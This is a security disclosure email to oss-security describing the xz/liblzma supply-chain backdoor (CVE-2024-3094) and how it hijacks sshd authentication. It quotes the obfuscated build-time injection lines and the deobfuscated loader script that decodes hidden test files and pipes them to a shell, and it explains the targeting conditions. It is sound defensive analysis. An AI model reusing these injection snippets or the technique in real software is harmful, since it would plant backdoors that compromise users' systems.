["```\nDate: Fri, 29 Mar 2024 08:51:26 -0700\nFrom: Andres Freund <andres@...razel.de>\nTo: oss-security@...ts.openwall.com\nSubject: backdoor in upstream xz/liblzma leading to ssh server compromise\n\nHi,\n\nAfter observing a few odd symptoms around liblzma (part of the xz package) on\nDebian sid installations over the last weeks (logins with ssh taking a lot of\nCPU, valgrind errors) I figured out the answer:\n\nThe upstream xz repository and the xz tarballs have been backdoored.\n\nAt first I thought this was a compromise of debian's package, but it turns out\nto be upstream.\n\n== Compromised Release Tarball ==\n\nOne portion of the backdoor is *solely in the distributed tarballs*. For\neasier reference, here's a link to debian's import of the tarball, but it is\nalso present in the tarballs for 5.6.0 and 5.6.1:\n\nhttps://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63\n\nThat line is *not* in the upstream source of build-to-host, nor is\nbuild-to-host used by xz in git.  However, it is present in the tarballs\nreleased upstream, except for the \"source code\" links, which I think github\ngenerates directly from the repository contents:\n\nhttps://github.com/tukaani-project/xz/releases/tag/v5.6.0\nhttps://github.com/tukaani-project/xz/releases/tag/v5.6.1\n\nThis injects an obfuscated script to be executed at the end of configure. This\nscript is fairly obfuscated and data from \"test\" .xz files in the repository.\n\nThis script is executed and, if some preconditions match, modifies\n$builddir/src/liblzma/Makefile to contain\n\nam__test = bad-3-corrupt_lzma2.xz\n...\nam__test_dir=$(top_srcdir)/tests/files/$(am__test)\n...\nsed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1\n\nwhich ends up as\n...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr \"\t \\-_\" \" \t_\\-\" | xz -d | /bin/bash >/dev/null 2>&1; ...\n\nLeaving out the \"| bash\" that produces\n\n####Hello####\n#��Z�.hj�\neval `grep ^srcdir= config.status`\nif test -f ../../config.status;then\neval `grep ^srcdir= ../../config.status`\nsrcdir=\"../../$srcdir\"\nfi\nexport i=\"((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)\";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr \"\\5-\\51\\204-\\377\\52-\\115\\132-\\203\\0-\\4\\116-\\131\" \"\\0-\\377\")|xz -F raw --lzma1 -dc|/bin/sh\n####World####\n\nAfter de-obfuscation this leads to the attached injected.txt.\n\n== Compromised Repository ==\n\nThe files containing the bulk of the exploit are in an obfuscated form in\n  tests/files/bad-3-corrupt_lzma2.xz\n  tests/files/good-large_compressed.lzma\ncommitted upstream. They were initially added in\nhttps://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0\n\nNote that the files were not even used for any \"tests\" in 5.6.0.\n\nSubsequently the injected code (more about that below) caused valgrind errors\nand crashes in some configurations, due the stack layout differing from what\nthe backdoor was expecting.  These issues were attempted to be worked around\nin 5.6.1:\n\nhttps://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad\nhttps://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f\nhttps://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92\n\nFor which the exploit code was then adjusted:\nhttps://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89\n\nGiven the activity over several weeks, the committer is either directly\ninvolved or there was some quite severe compromise of their\nsystem. Unfortunately the latter looks like the less likely explanation, given\nthey communicated on various lists about the \"fixes\" mentioned above.\n\nFlorian Weimer first extracted the injected code in isolation, also attached,\nliblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!\n\n== Affected Systems ==\n\nThe attached de-obfuscated script is invoked first after configure, where it\ndecides whether to modify the build process to inject the code.\n\nThese conditions include targeting only x86-64 linux:\n    if ! (echo \"$build\" | grep -Eq \"^x86_64\" > /dev/null 2>&1) && (echo \"$build\" | grep -Eq \"linux-gnu$\" > /dev/null 2>&1);then\n\nBuilding with gcc and the gnu linker\n    if test \"x$GCC\" != 'xyes' > /dev/null 2>&1;then\n    exit 0\n    fi\n    if test \"x$CC\" != 'xgcc' > /dev/null 2>&1;then\n    exit 0\n    fi\n    LDv=$LD\" -v\"\n    if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then\n    exit 0\n\nRunning as part of a debian or RPM package build:\n    if test -f \"$srcdir/debian/rules\" || test \"x$RPM_ARCH\" = \"xx86_64\";then\n\nParticularly the latter is likely aimed at making it harder to reproduce the\nissue for investigators.\n\nDue to the working of the injected code (see below), it is likely the backdoor\ncan only work on glibc based systems.\n\nLuckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux\ndistributions, and where they have, mostly in pre-release versions.\n\n== Observing Impact on openssh server ==\n\nWith the backdoored liblzma installed, logins via ssh become a lot slower.\n\ntime ssh nonexistant@...alhost\n\nbefore:\nnonexistant@...alhost: Permission denied (publickey).\n\nbefore:\nreal\t0m0.299s\nuser\t0m0.202s\nsys\t0m0.006s\n\nafter:\nnonexistant@...alhost: Permission denied (publickey).\n\nreal\t0m0.807s\nuser\t0m0.202s\nsys\t0m0.006s\n\nopenssh does not directly use liblzma. However debian and several other\ndistributions patch openssh to support systemd notification, and libsystemd\ndoes depend on lzma.\n\nInitially starting sshd outside of systemd did not show the slowdown, despite\nthe backdoor briefly getting invoked. This appears to be part of some\ncountermeasures to make analysis harder.\n\nObserved requirements for the exploit:\na) TERM environment variable is not set\nb) argv[0] needs to be /usr/sbin/sshd\nc) LD_DEBUG, LD_PROFILE are not set\nd) LANG needs to be set\ne) Some debugging environments, like rr, appear to be detected. Plain gdb\n   appears to be detected in some situations, but not others\n\nTo reproduce outside of systemd, the server can be started with a clear\nenvironment, setting only the required variable:\n\nenv -i LANG=en_US.UTF-8 /usr/sbin/sshd -D\n\nIn fact, openssh does not need to be started as a server to observe the\nslowdown:\n\nslow:\nenv -i LANG=C /usr/sbin/sshd -h\n\n(about 0.5s on my older system)\n\nfast:\nenv -i LANG=C TERM=foo /usr/sbin/sshd -h\nenv -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h\n...\n\n(about 0.01s on the same system)\n\nIt's possible that argv[0] other /usr/sbin/sshd also would have effect - there\nare obviously lots of servers linking to libsystemd.\n\n== Analyzing the injected code ==\n\nI am *not* a security researcher, nor a reverse engineer.  There's lots of\nstuff I have not analyzed and most of what I observed is purely from\nobservation rather than exhaustively analyzing the backdoor code.\n\nTo analyze I primarily used \"perf record -e intel_pt//ub\" to observe where\nexecution diverges between the backdoor being active and not. Then also gdb,\nsetting breakpoints before the divergence.\n\nThe backdoor initially intercepts execution by replacing the ifunc resolvers\ncrc32_resolve(), crc64_resolve() with different code, which calls\n_get_cpuid(), injected into the code (which previously would just be static\ninline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing\nsymbol names.\n\nThese functions get resolved during startup, because sshd is built with\n-Wl,-z,now, leading to all symbols being resolved early. If started with\nLD_BIND_NOT=1 the backdoor does not appear to work.\n\nBelow crc32_resolve() _get_cpuid() does not do much, it just sees that a\n'completed' variable is 0 and increments it, returning the normal cpuid result\n(via a new _cpuid()). It gets to be more interesting during crc64_resolve().\n\nIn the second invocation crc64_resolve() appears to find various information,\nlike data from the dynamic linker, program arguments and environment. Then it\nperform various environment checks, including those above. There are other\nchecks I have not fully traced.\n\nIf the above decides to continue, the code appears to be parsing the symbol\ntables in memory. This is the quite slow step that made me look into the issue.\n\nNotably liblzma's symbols are resolved before many of the other libraries,\nincluding the symbols in the main sshd binary.  This is important because\nsymbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.\n\nTo be able to resolve symbols in libraries that have not yet loaded, the\nbackdoor installs an audit hook into the dynamic linker, which can be observed\nwith gdb using\n  watch _rtld_global_ro._dl_naudit\nIt looks like the audit hook is only installed for the main binary.\n\nThat hook gets called, from _dl_audit_symbind, for numerous symbols in the\nmain binary. It appears to wait for \"RSA_public_decrypt@....plt\" to be\nresolved.  When called for that symbol, the backdoor changes the value of\nRSA_public_decrypt@....plt to point to its own code.  It does not do this via\nthe audit hook mechanism, but outside of it.\n\nFor reasons I do not yet understand, it does change sym.st_value *and* the\nreturn value of from the audit hook to a different value, which leads\n_dl_audit_symbind() to do nothing - why change anything at all then?\n\nAfter that the audit hook is uninstalled again.\n\nIt is possible to change the got.plt contents at this stage because it has not\n(and can't yet) been remapped to be read-only.\n\nI suspect there might be further changes performed at this stage.\n\n== Impact on sshd ==\n\nThe prior section explains that RSA_public_decrypt@....plt was redirected to\npoint into the backdoor code. The trace I was analyzing indeed shows that\nduring a pubkey login the exploit code is invoked:\n\n            sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0 RSA_public_decrypt@...+0x0 (/usr/sbin/sshd)\n\nThe backdoor then calls back into libcrypto, presumably to perform normal authentication\n\n            sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)\n\nI have not yet analyzed precisely what is being checked for in the injected\ncode, to allow unauthorized access. Since this is running in a\npre-authentication context, it seems likely to allow some form of access or\nother form of remote code execution.\n\nI'd upgrade any potentially vulnerable system ASAP.\n\n== Bug reports ==\n\nGiven the apparent upstream involvement I have not reported an upstream\nbug. As I initially thought it was a debian specific issue, I sent a more\npreliminary report to security@...ian.org.  Subsequently I reported the issue\nto distros@. CISA was notified by a distribution.\n\nRed Hat assigned this issue CVE-2024-3094.\n\n== Detecting if installation is vulnerable ==\n\nVegard Nossum wrote a script to detect if it's likely that the ssh binary on a\nsystem is vulnerable, attached here. Thanks!\n\nGreetings,\n\nAndres Freund\n\n**View attachment \"**[injected.txt](4/1)**\" of type \"**text/plain**\" (8236 bytes)**\n\n**Download attachment \"**[liblzma_la-crc64-fast.o.gz](4/2)**\" of type \"**application/gzip**\" (36487 bytes)**\n\n**Download attachment \"**[detect.sh](4/3)**\" of type \"**application/x-sh**\" (426 bytes)**\n\n```"]